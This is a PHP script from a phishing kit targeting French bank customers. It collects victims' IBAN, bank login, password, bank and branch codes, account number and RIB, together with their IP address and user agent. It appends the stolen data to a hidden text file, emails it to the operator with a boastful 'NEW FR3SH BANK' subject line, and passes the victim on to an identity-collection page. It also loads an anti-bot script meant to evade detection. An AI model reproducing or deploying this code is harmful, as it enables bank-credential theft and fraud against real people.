<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
include'iban.php';
include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
if($_POST['ibansub']){
$string = $_POST["iban"];
    $message = '
🏦  Bank Nom : '.$_SESSION["bankname"].'
🏦  Bank Pays : '.$_SESSION["bankcountry"].'
🏦  IBAN : '.$_POST["iban"].'
🏦  Bank Utilisateur : '.$_POST["bankid"].'
🏦  Bank Mot-Pass : '.$_POST["bankpass"].'
🏦  IP: '._ip().'
🏦  User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
}else if($_POST['infosub']){
    $message = '
🏦  Bank Nom : '.$_SESSION["bankname"].'
🏦  Bank Pays : '.$_SESSION["bankcountry"].'
🏦  Bank Code: '.$_POST["codebank"].'
🏦  Code Guichet: '.$_POST["codeguichet"].'
🏦  Numero de Compte : '.$_POST["ncompte"].'
🏦  RIB : '.$_POST["rib"].'
🏦  Bank Utilisateur : '.$_POST["bankid"].'
🏦  Bank Mot-Pass : '.$_POST["bankpass"].'
🏦  IP: '._ip().'
🏦  User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
}
$Subject="💵NEW FR3SH BANK💵  |"._ip();
$head="From: ⭐S4N705⭐  <Bank>";
if(isset($string) && !verify_iban($string,$machine_format_only=false)){
     header('location: bank.php?error=true');
}else {
	$fil = fopen('0n_r3z_p4s_n0us.txt', 'a+');
fwrite($fil, PHP_EOL.'####################'.$message.PHP_EOL.'####################');
$_SESSION['step_five']  = true;
mail($my_mail,$Subject,$message,$head);
		header('location: identity.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
}
}
else
{
	header('location: ../../index.php');
}
